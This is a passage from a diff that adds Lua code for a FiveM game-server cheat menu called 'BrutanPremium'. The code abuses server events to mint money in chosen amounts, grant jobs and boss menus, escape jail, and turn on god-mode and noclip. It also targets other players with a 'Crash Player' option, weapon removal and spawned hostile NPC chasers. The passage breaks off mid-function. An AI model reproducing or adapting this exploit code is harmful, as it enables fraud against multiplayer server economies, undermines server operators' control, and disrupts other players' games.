+                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
+                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
+                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
+                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
+                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
+                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
+                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
+                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
+                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
+                    TriggerServerEvent("esx_blanchisseur:startWhitening", 1)
+                elseif BrutanPremium.Button("Stop all (Drugs)") then
+                    TriggerServerEvent("esx_drugs:stopHarvestCoke")
+                    TriggerServerEvent("esx_drugs:stopTransformCoke")
+                    TriggerServerEvent("esx_drugs:stopSellCoke")
+                    TriggerServerEvent("esx_drugs:stopHarvestMeth")
+                    TriggerServerEvent("esx_drugs:stopTransformMeth")
+                    TriggerServerEvent("esx_drugs:stopSellMeth")
+                    TriggerServerEvent("esx_drugs:stopHarvestWeed")
+                    TriggerServerEvent("esx_drugs:stopTransformWeed")
+                    TriggerServerEvent("esx_drugs:stopSellWeed")
+                    TriggerServerEvent("esx_drugs:stopHarvestOpium")
+                    TriggerServerEvent("esx_drugs:stopTransformOpium")
+                    TriggerServerEvent("esx_drugs:stopSellOpium")
+                end
+
+
+                BrutanPremium.Display()
+-- 4x482
+            elseif BrutanPremium.IsMenuOpened("ESXBossMenu") then
+                if BrutanPremium.Button("~c~Mechanic~w~ Boss Menu") then
+					TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end)
+					setMenuVisible(currentMenu, false)
+				elseif BrutanPremium.Button("~b~Police~w~ Boss Menu") then
+					TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
+					setMenuVisible(currentMenu, false)
+				elseif BrutanPremium.Button("~r~Ambulance~w~ Boss Menu") then
+					TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
+					setMenuVisible(currentMenu, false)
+				elseif BrutanPremium.Button("~y~Taxi~w~ Boss Menu") then
+					TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
+					setMenuVisible(currentMenu, false)
+				elseif BrutanPremium.Button("~g~Real Estate~w~ Boss Menu") then
+					TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
+					setMenuVisible(currentMenu, false)
+				elseif BrutanPremium.Button("~p~Gang~w~ Boss Menu") then
+					TriggerEvent('esx_society:openBossMenu', 'gang', function(data,menu) menu.close() end)
+					setMenuVisible(currentMenu, false)
+				elseif BrutanPremium.Button("~o~Car Dealer~w~ Boss Menu") then
+					TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end)
+					setMenuVisible(currentMenu, false)
+				elseif BrutanPremium.Button("~y~Banker~w~ Boss Menu") then
+					TriggerEvent('esx_society:openBossMenu', 'banker', function(data,menu) menu.close() end)
+					setMenuVisible(currentMenu, false)
+				elseif BrutanPremium.Button("~c~Mafia~w~ Boss Menu") then
+					TriggerEvent('esx_society:openBossMenu', 'mafia', function(data,menu) menu.close() end)
+					setMenuVisible(currentMenu, false)
+				elseif BrutanPremium.Button("~g~ESX ~y~Custom Boss Menu") then
+					local result = KeyboardInput("Enter Boss Menu Script Name", "", 10)
+					if result then
+						TriggerEvent('esx_society:openBossMenu', result, function(data,menu) menu.close() end)
+					setMenuVisible(currentMenu, false)
+					end
+				end
+
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("ESXJobMenu") then
+                if BrutanPremium.Button("Unemployed") then
+                    TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(-1))
+                elseif BrutanPremium.Button("Police") then
+                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"police",3)
+                elseif BrutanPremium.Button("Mechanic") then
+                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"mecano",3)
+                elseif BrutanPremium.Button("Taxi") then
+                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"taxi",3)
+                elseif BrutanPremium.Button("Ambulance") then
+                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"ambulance",3)
+                elseif BrutanPremium.Button("Real Estate Agent") then
+                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"realestateagent",3)
+                elseif BrutanPremium.Button("Car Dealer") then
+                    TriggerServerEvent("NB:recruterplayer",GetPlayerServerId(-1),"cardealer",3)
+                end
+
+                BrutanPremium.Display()
+                        elseif BrutanPremium.IsMenuOpened("ESXMoneyMenu") then
+                if BrutanPremium.Button("-» Ultimate moneymaker «-") then
+				local result = KeyboardInput("Enter amount of money", "", 100000000)
+				if result then
+				TriggerServerEvent('esx_truckerjob:pay', result)
+				TriggerServerEvent('vrp_slotmachine:server:2', result)
+				TriggerServerEvent("esx_pizza:pay", result)
+				TriggerServerEvent('esx_jobs:caution', 'give_back', result)
+				TriggerServerEvent('lscustoms:payGarage', result)
+				TriggerServerEvent('esx_tankerjob:pay', result)
+				TriggerServerEvent('esx_vehicletrunk:giveDirty', result)
+				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', result)
+				TriggerServerEvent('gambling:spend', result)
+				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', result)
+				TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
+				TriggerServerEvent('AdminMenu:giveBank', result)
+				TriggerServerEvent('AdminMenu:giveCash', result)
+				TriggerServerEvent('esx_slotmachine:sv:2', result)
+				TriggerServerEvent('esx_truckerjob:pay', result)
+				TriggerServerEvent('esx_moneywash:deposit', result)
+				TriggerServerEvent('esx_moneywash:withdraw', result)
+				TriggerServerEvent('esx_moneywash:deposit', result)
+			    TriggerServerEvent('mission:completed', result)
+				TriggerServerEvent('truckerJob:success',result)-- 4x482
+				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', result)
+				TriggerServerEvent('99kr-burglary:addMoney', result)
+				end
+			elseif BrutanPremium.Button("~g~Caution give back $") then
+				local result = KeyboardInput("Enter amount of money", "", 100000000)
+				if result then
+				TriggerServerEvent("esx_jobs:caution", "give_back", result)
+				end
+			elseif BrutanPremium.Button("~g~Truckerjob $") then
+				local result = KeyboardInput("Enter amount of money", "", 100000000)
+				if result then
+				TriggerServerEvent('esx_truckerjob:pay', result)
+				end
+			elseif BrutanPremium.Button("~g~Admin give bank $") then
+				local result = KeyboardInput("Enter amount of money", "", 100000000)
+				if result then
+				TriggerServerEvent('AdminMenu:giveBank', result)
+				end
+			elseif BrutanPremium.Button("~g~Admin give cash $") then
+				local result = KeyboardInput("Enter amount of money", "", 100000000)
+				if result then
+				TriggerServerEvent('AdminMenu:giveCash', result)
+				end
+			elseif BrutanPremium.Button("~g~Postal job $") then
+				local result = KeyboardInput("Enter amount of money", "", 100000000)
+				if result then
+					TriggerServerEvent("esx_gopostaljob:pay", result)
+				end
+			elseif BrutanPremium.Button("~g~Bank security $") then
+				local result = KeyboardInput("Enter amount of money", "", 100000000)
+				if result then
+					TriggerServerEvent("esx_banksecurity:pay", result)
+				end
+			elseif BrutanPremium.Button("~g~Slotmachine $") then
+				local result = KeyboardInput("Enter amount of money", "", 100000000)
+				if result then
+					TriggerServerEvent("esx_slotmachine:sv:2", result)
+				end
+			elseif BrutanPremium.Button("~g~ LScustoms $") then
+				local result = KeyboardInput("Enter amount of money", "", 100)
+				if result then
+					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
+				end		
+			elseif BrutanPremium.Button("~g~Slotmachine(2) $") then
+				local result = KeyboardInput("Enter amount of money", "", 100)
+				if result then
+				TriggerServerEvent("vrp_slotmachine:server:2", result)
+				end
+			elseif BrutanPremium.Button("~g~Dirty money $") then
+				local result = KeyboardInput("Enter amount of money", "", 100000000)
+				if result then
+					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
+				end
+			elseif BrutanPremium.Button("~g~Delivery $") then
+				local result = KeyboardInput("Enter amount of money", "", 100000000)
+				if result then
+					TriggerServerEvent('delivery:success', result)
+				end
+			elseif BrutanPremium.Button("~g~Taxijob $") then
+				local result = KeyboardInput("Enter amount of money", "", 100000000)
+				if result then
+					TriggerServerEvent ('taxi:success', result)
+				end
+			elseif BrutanPremium.Button("~g~Taxijob 10.000x $") then
+				a=1 repeat TriggerServerEvent('esx_taxijob:success') a=a+1 until (a>10000)
+			elseif BrutanPremium.Button("~g~Pilot & Taxi (~g~ESX~s~) $") then
+					TriggerServerEvent('esx_pilot:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_pilot:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_pilot:success')
+					TriggerServerEvent('esx_taxijob:success')
+					TriggerServerEvent('esx_pilot:success')
+			elseif BrutanPremium.Button("~g~Garbagejob $") then
+				local result = KeyboardInput("Enter amount of money", "", 100000000)
+				if result then
+					TriggerServerEvent("esx_garbagejob:pay", result)
+				end	
+			elseif BrutanPremium.Button("~g~Paycheck $") then
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				TriggerServerEvent('paycheck:salary')
+				end
+
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("SelfMenu") then
+			if BrutanPremium.MenuButton("~r~→  ~s~Ped Menu", "PedMenu") then
+                                elseif BrutanPremium.Button("~g~Heal ~s~Yourself") then
+                    SetEntityHealth(PlayerPedId(), 200)
+                elseif BrutanPremium.Button("Get Some ~b~Armor") then
+                    SetPedArmour(PlayerPedId(), 200)
+				elseif BrutanPremium.Button("Go Invisible") then
+				local model2 = GetHashKey("mp_m_niko_01")
+				local player2 = PlayerId()
+				local playerPed = GetPlayerPed(-1)
+				 RequestModel(model2)
+     while not HasModelLoaded(model2) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player2, model2)
+    SetModelAsNoLongerNeeded(model2)
+					elseif BrutanPremium.Button("Go Visible Again") then
+				local model3 = GetHashKey("mp_m_freemode_01")
+				local player3 = PlayerId()
+				local playerPed = GetPlayerPed(-1)
+				 RequestModel(model3)
+     while not HasModelLoaded(model3) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player3, model3)
+		SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+    SetModelAsNoLongerNeeded(model3)
+                elseif BrutanPremium.Button("~o~Food~s~ & ~b~Water ~s~100% (~g~ESX~s~)") then
+                    TriggerEvent("esx_status:set", "hunger", 1000000)
+                    TriggerEvent("esx_status:set", "thirst", 1000000)
+				elseif BrutanPremium.Button("Get Some $ ~g~(~g~ESX~s~)") then
+				TriggerServerEvent("esx_godirtyjob:pay", 500000)
+				TriggerServerEvent("esx_pizza:pay", 500000)
+				TriggerServerEvent("esx_slotmachine:sv:2", 500000)
+				TriggerServerEvent("esx_banksecurity:pay", 500000)
+				TriggerServerEvent('AdminMenu:giveDirtyMoney', 500000)
+				TriggerServerEvent('AdminMenu:giveBank', 500000)        
+				TriggerServerEvent("AdminMenu:giveCash", 500000)
+				TriggerServerEvent("esx_gopostaljob:pay", 500000)
+				TriggerServerEvent("AdminMenu:giveBank", 500000)
+				TriggerServerEvent("esx_truckerjob:pay", 500000)
+				TriggerServerEvent("esx_carthief:pay", 500000)
+			    TriggerServerEvent("esx_garbagejob:pay", 500000)
+				TriggerServerEvent("esx_ranger:pay", 500000)
+				TriggerServerEvent("esx_truckersjob:payy", 500000)
+				PlaySoundFrontend(-1, "ROBBERY_MONEY_TOTAL", "HUD_FRONTEND_CUSTOM_SOUNDSET", true)
+				drawNotification("~g~KA-CHING $$")
+				elseif BrutanPremium.Button("Get some $ ~b~(VRP)") then
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent("dropOff", 100000)
+			    TriggerServerEvent("dropOff", 100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				TriggerServerEvent('PayForRepairNow',-100000)
+				drawNotification("~g~KA-CHING $$")
+                elseif BrutanPremium.Button("Revive yourself (~g~ESX~s~)") then
+                    TriggerEvent("esx_ambulancejob:revive")
+					TriggerEvent("ambulancier:selfRespawn")
+				elseif BrutanPremium.Button("Open Jail Menu (~g~ESX~s~)") then
+					TriggerEvent("esx-qalle-jail:openJailMenu")
+                elseif BrutanPremium.Button("Get Out Of Jail (~g~ESX~s~)") then
+                    local ped = PlayerPedId(-1)
+                    TriggerServerEvent("esx-qalle-jail:jailPlayer",GetPlayerServerId(ped),0,"escaperino")
+                    TriggerServerEvent("esx_jailer:sendToJail",GetPlayerServerId(ped),0)
+                    TriggerServerEvent("esx_jail:sendToJail",GetPlayerServerId(ped),0)
+					TriggerServerEvent("esx_jailer:unjailTime", -1)
+					TriggerServerEvent("JailUpdate", 0)
+					TriggerEvent("UnJP")
+                    TriggerServerEvent("js:jailuser",GetPlayerServerId(ped),0,"escaperino")
+                elseif BrutanPremium.Button("~r~Kys") then
+                    SetEntityHealth(PlayerPedId(), 0)
+                elseif  BrutanPremium.CheckBox(
+                    "God-Mode",
+                    godmode,
+                    function(enabled)
+                    godmode = enabled
+                    end)
+                then
+				elseif BrutanPremium.CheckBox(
+                    "~o~Nuke ~s~Punches",
+                    explosiveAmmo,
+                    function(enabled)
+                        explosiveAmmo = enabled
+                    end)
+                then
+                elseif BrutanPremium.CheckBox(
+                    "Never Get Tired",
+                    infStamina,
+                    function(enabled)
+                    infStamina = enabled
+                    end)
+                then
+                elseif BrutanPremium.CheckBox(
+                    "Fast Run",
+                    fastrun,
+                    function(enabled)
+                        fastrun = enabled
+                    end)
+                then
+                elseif BrutanPremium.CheckBox(
+                    "Super Jump",
+                    SuperJump,
+                    function(enabled)
+                        SuperJump = enabled
+                    end)
+                then
+                elseif BrutanPremium.CheckBox(
+                    "Noclip",
+                    Noclip,
+                    function(enabled)
+                        Noclip = enabled
+                    end)
+                then
+                end
+
+                BrutanPremium.Display()
+			elseif BrutanPremium.IsMenuOpened("PedMenu") then
+				if BrutanPremium.ComboBox("MalePed", peds2, currentPedd, selectedPedd, function(currentIndex, selectedIndex)
+                    currentPedd = currentIndex
+                    selectedPedd = selectedIndex
+                end)
+                then
+				elseif BrutanPremium.ComboBox("FemalePed", peds3, currentPeddd, selectedPeddd, function(currentIndex, selectedIndex)
+                    currentPeddd = currentIndex
+                    selectedPeddd = selectedIndex
+                end)
+                then
+				elseif BrutanPremium.ComboBox("AnimalPed", peds4, currentPedddd, selectedPedddd, function(currentIndex, selectedIndex)
+                    currentPedddd = currentIndex
+                    selectedPedddd = selectedIndex
+                end)
+                then
+			elseif BrutanPremium.Button("Change To Selected ~b~Male") then
+					Deer.Destroy()
+		Wait(100)
+				local model1 = GetHashKey(peds2[selectedPedd])
+				local player1 = PlayerId()
+                local playerPed = GetPlayerPed(-1)
+				
+    RequestModel(model1)
+    while not HasModelLoaded(model1) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player1, model1)
+	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+    SetModelAsNoLongerNeeded(model1)
+	elseif BrutanPremium.Button("Change To Selected ~p~Female") then
+		Deer.Destroy()
+		Wait(100)
+				local model5 = GetHashKey(peds3[selectedPeddd])
+				local player5 = PlayerId()
+                local playerPed = GetPlayerPed(-1)
+				
+    RequestModel(model5)
+    while not HasModelLoaded(model5) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player5, model5)
+	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+    SetModelAsNoLongerNeeded(model5)
+	elseif BrutanPremium.Button("Change To Selected ~y~Animal") then
+			Deer.Destroy()
+		Wait(100)
+				local model6 = GetHashKey(peds4[selectedPedddd])
+				local player6 = PlayerId()
+                local playerPed = GetPlayerPed(-1)
+				
+    RequestModel(model6)
+    while not HasModelLoaded(model6) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player6, model6)
+	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+    SetModelAsNoLongerNeeded(model6)
+		elseif BrutanPremium.Button("Spawn A ~y~Deer ~s~And Ride It") then
+     Deer.Create()
+	Citizen.Wait(150)
+	 Deer.Ride()
+				elseif BrutanPremium.Button("Change To FiveM Ped") then
+						Deer.Destroy()
+		Wait(100)
+				local model3 = GetHashKey("mp_m_freemode_01")
+				local player3 = PlayerId()
+				local playerPed = GetPlayerPed(-1)
+				 RequestModel(model3)
+     while not HasModelLoaded(model3) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player3, model3)
+	SetPedDefaultComponentVariation(GetPlayerPed(-1))
+    SetModelAsNoLongerNeeded(model3)
+	elseif BrutanPremium.Button("Change To ~y~Trevor") then
+			Deer.Destroy()
+		Wait(100)
+				local model13 = GetHashKey("player_two")
+				local player1 = PlayerId()
+                local playerPed = GetPlayerPed(-1)
+				
+    RequestModel(model13)
+    while not HasModelLoaded(model13) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player1, model13)
+	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+    SetModelAsNoLongerNeeded(model1)
+	elseif BrutanPremium.Button("Change To ~b~Michael") then
+			Deer.Destroy()
+		Wait(100)
+				local model12 = GetHashKey("player_zero")
+				local player1 = PlayerId()
+                local playerPed = GetPlayerPed(-1)
+				
+    RequestModel(model12)
+    while not HasModelLoaded(model12) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player1, model12)
+	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+    SetModelAsNoLongerNeeded(model12)
+	elseif BrutanPremium.Button("Change To ~g~Franklin") then
+			Deer.Destroy()
+		Wait(100)
+				local model11 = GetHashKey("player_one")
+				local player1 = PlayerId()
+                local playerPed = GetPlayerPed(-1)
+				
+    RequestModel(model11)
+    while not HasModelLoaded(model11) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player1, model11)
+	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+    SetModelAsNoLongerNeeded(model11)
+	elseif BrutanPremium.Button("Change To ~r~Alien") then
+			Deer.Destroy()
+		Wait(100)
+				local model121 = GetHashKey("s_m_m_movalien_01")
+				local player1 = PlayerId()
+                local playerPed = GetPlayerPed(-1)
+				
+    RequestModel(model121)
+    while not HasModelLoaded(model121) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player1, model121)
+	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+    SetModelAsNoLongerNeeded(model121)
+	elseif BrutanPremium.Button("Change To ~h~Bigfoot") then
+			Deer.Destroy()
+		Wait(100)
+				local model122 = GetHashKey("ig_orleans")
+				local player1 = PlayerId()
+                local playerPed = GetPlayerPed(-1)
+				
+    RequestModel(model122)
+    while not HasModelLoaded(model122) do
+        Wait(100)
+    end
+
+    SetPlayerModel(player1, model122)
+	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
+    SetModelAsNoLongerNeeded(model122)
+	elseif BrutanPremium.Button("Change Clothes (~g~ESX~s~) (NOT TESTED)") then
+    TriggerEvent('esx_skin:openSaveableMenu')
+	end
+	BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("OnlinePlayersMenu") then
+                    for i = 0, 128 do
+                        if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and BrutanPremium.MenuButton("~r~→  ~s~Name: "..GetPlayerName(i).." | ID: "..GetPlayerServerId(i).." | "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~Dead ~s~|" or "~g~Alive ~s~|"), "PlayerOptionsMenu") then
+                            SelectedPlayer = i
+                        end
+                    end
+
+                    BrutanPremium.Display()
+                elseif BrutanPremium.IsMenuOpened("PlayerOptionsMenu") then
+                    BrutanPremium.SetSubTitle("PlayerOptionsMenu", "Player Options ["..GetPlayerName(SelectedPlayer).."]")
+                    if BrutanPremium.Button("Spectate", (Spectating and "~g~[SPECTATING]")) then
+                        SpectatePlayer(SelectedPlayer)
+					elseif BrutanPremium.Button('~g~Heal ~s~Player') then
+                    local dU = 'PICKUP_HEALTH_STANDARD'
+                    local dV = GetHashKey(dU)
+                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
+                    CreateAmbientPickup(dV, bK.x, bK.y, bK.z + 1.0, 1, 1, dV, 1, 0)
+                    SetPickupRegenerationTime(pickup, 60)
+                elseif BrutanPremium.Button('~b~Armour ~s~Player') then
+                    local dW = 'PICKUP_ARMOUR_STANDARD'
+                    local dX = GetHashKey(dW)
+                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
+                    local pickup = CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0)
+                    SetPickupRegenerationTime(pickup, 60)
+                elseif BrutanPremium.Button('~b~FULL Armour ~s~Player') then
+                    local dW = 'PICKUP_ARMOUR_STANDARD'
+                    local dX = GetHashKey(dW)
+                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
+                    for i = 0, 99 do
+                        Citizen.Wait(0)
+                        CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0)
+                        SetPickupRegenerationTime(pickup, 10)
+                        i = i + 1
+                    end
+					elseif BrutanPremium.Button("Open inventory") then
+					TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
+					elseif BrutanPremium.Button("Teleport To Player With Vehicle") then
+										drawNotification(
+                            'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
+                        )
+                    local cP = KeyboardInput('Are you sure you want to teleport? y/n', '', 0)
+                    if cP == 'y' then
+                        local Entity =
+                            IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
+                            PlayerPedId(-1)
+                        SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
+                    elseif cP == 'n' then
+                        drawNotification(
+                            '~h~~r~Operation cancelled~s~.'
+                        )
+                    else
+                        drawNotification(
+                            '~h~~r~Invalid Confirmation~s~.'
+                        )
+                        drawNotification(
+                            '~h~~r~Operation cancelled~s~.'
+                        )
+                    end
+                    elseif BrutanPremium.Button("Teleport To Player") then
+										drawNotification(
+                            'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
+                        )
+                    local cP = KeyboardInput('Are you sure you want to teleport? y/n', '', 0)
+                    if cP == 'y' then
+                        local Entity =
+                            IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
+                            PlayerPedId(-1)
+                        SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
+                    elseif cP == 'n' then
+                        drawNotification(
+                            '~h~~r~Operation cancelled~s~.'
+                        )
+                    else
+                        drawNotification(
+                            '~h~~r~Invalid Confirmation~s~.'
+                        )
+                        drawNotification(
+                            '~h~~r~Operation cancelled~s~.'
+                        )
+                    end
+					elseif BrutanPremium.Button("~g~Give ~w~Money") then
+						local result = KeyboardInput("Enter amount of money to give", "", 100000000)
+						if result then
+						TriggerServerEvent('esx:giveInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money", "money", result)    
+						end
+                    elseif BrutanPremium.Button("Crash Player") then
+                        CrashPlayer(GetPlayerPed(SelectedPlayer))
+                    elseif BrutanPremium.MenuButton("~r~→  ~s~Troll Options", "PlayerTrollMenu") then
+                    elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Options", "PlayerESXMenu") then
+                    elseif BrutanPremium.MenuButton("~r~→  ~s~Choose weapon", "SingleWepPlayer") then
+                    elseif BrutanPremium.Button("Give Ammo") then
+                        for i = 1, #allWeapons do
+                            AddAmmoToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250)
+                        end
+                    elseif BrutanPremium.Button("Give All Weapons") then
+                        for i = 1, #allWeapons do
+                            GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 250, false, false)
+                        end
+                    elseif BrutanPremium.Button("Remove All Weapons") then
+                        for i = 1, #allWeapons do
+                            RemoveAllPedWeapons(GetPlayerPed(SelectedPlayer), true)
+                        end
+                    elseif BrutanPremium.Button("Give Vehicle") then
+                        local ped = GetPlayerPed(SelectedPlayer)
+                        local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
+
+                        if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
+                            RequestModel(ModelName)
+                            while not HasModelLoaded(ModelName) do
+                                Citizen.Wait(0)
+                            end
+
+                            local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
+                            drawNotification("~g~Vehicle Given To Player!")
+                        else
+                            drawNotification("~r~Model is not valid!")
+                        end
+					elseif BrutanPremium.Button('Clone Car') then
+                    ClonePedVeh()
+					elseif BrutanPremium.Button('Spawn Following Asshat') then
+                    Citizen.CreateThread(function()
+                    asshat = true
+                    local target = GetPlayerPed(SelectedPlayer)
+                    local assped = nil
+                    local vehlist = {'Nero', 'Deluxo', 'Raiden', 'Bati2', "SultanRS", "TA21", "Lynx", "ZR380", "Streiter", "Neon", "Italigto", "Nero2", "Fmj", "le7b", "prototipo", "cyclone", "khanjali", "STROMBERG", "BARRAGE", "COMET5"}
+                    local veh = vehlist[math.random(#vehlist)]
+                    local pos = GetEntityCoords(GetPlayerPed(SelectedPlayer))
+                    local pitch = GetEntityPitch(GetPlayerPed(SelectedPlayer))
+                    local roll = GetEntityRoll(GetPlayerPed(SelectedPlayer))
+                    local yaw = GetEntityRotation(GetPlayerPed(SelectedPlayer)).z
+                    local xf = GetEntityForwardX(GetPlayerPed(SelectedPlayer))
+                    local yf = GetEntityForwardY(GetPlayerPed(SelectedPlayer))
+                    if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), false) then
+                        local vt = GetVehiclePedIsIn(GetPlayerPed(SelectedPlayer), 0)
+                        NetworkRequestControlOfEntity(vt)
+                        SetVehicleModKit(vt, 0)
+                        ToggleVehicleMod(vt, 20, 1)
+                        SetVehicleModKit(vt, 0)
+                        SetVehicleTyresCanBurst(vt, 1)
+                    end
+                    local v = nil
+                    RequestModel(veh)
+                    RequestModel('s_m_y_hwaycop_01')
+                    while not HasModelLoaded(veh) and not HasModelLoaded('s_m_m_security_01') do
+                        RequestModel('s_m_y_hwaycop_01')
+                        Citizen.Wait(0)
+                        RequestModel(veh)
+                    end
+                    if HasModelLoaded(veh) then
+                        Citizen.Wait(50)
+                        v =
+                            CreateVehicle(
+                            veh,
+                            pos.x - (xf * 10),
+                            pos.y - (yf * 10),
+                            pos.z + 1,
+                            GetEntityHeading(GetPlayerPed(-1)),
+                            1,
+                            1
+                        )
+                        v1 =
+                            CreateVehicle(
+                            veh,
+                            pos.x - (xf * 10) + 2,
+                            pos.y - (yf * 10) + 2,
+                            pos.z + 1,
+                            GetEntityHeading(GetPlayerPed(-1)),
+                            1,
+                            1
+                        )
+                        SetVehicleGravityAmount(v, 15.0)
+                        SetVehicleGravityAmount(v1, 15.0)
+                        SetEntityInvincible(v, true)
+                        SetEntityInvincible(v1, true)
+                        if DoesEntityExist(v) then
+                            NetworkRequestControlOfEntity(v)
+                            SetVehicleDoorsLocked(v, 4)
+                            RequestModel('s_m_y_hwaycop_01')
+                            Citizen.Wait(50)
+                            if HasModelLoaded('s_m_y_hwaycop_01') then
+                                Citizen.Wait(50)
+                                local pas = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
+                                local pas1 = CreatePed(21, GetHashKey('s_m_y_swat_01'), pos.x, pos.y, pos.z, true, false)
+                                local ped = CreatePed(21, GetHashKey('s_m_y_hwaycop_01'), pos.x, pos.y, pos.z, true, false)
